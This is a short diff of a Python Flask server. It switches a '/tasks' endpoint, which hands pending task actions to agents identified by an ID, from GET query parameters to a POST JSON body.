@@ -135,11 +135,12 @@ def heartbeat():
     except:
         pass
 
-@app.route('/tasks', methods=['GET'])
+@app.route('/tasks', methods=['POST'])
 def get_task():
-    agent_id = request.args.get('agent_id')
-    if agent_id:
-        task = Task.query.filter_by(agent_id=agent_id, completed=False).first()
+    ip = request.json.get('agent_id')
+    #agent_id = request.args.get('agent_id')
+    if ip:
+        task = Task.query.filter_by(agent_id=ip, completed=False).first()
         if task:
             task_data = {
                 'action': task.action,
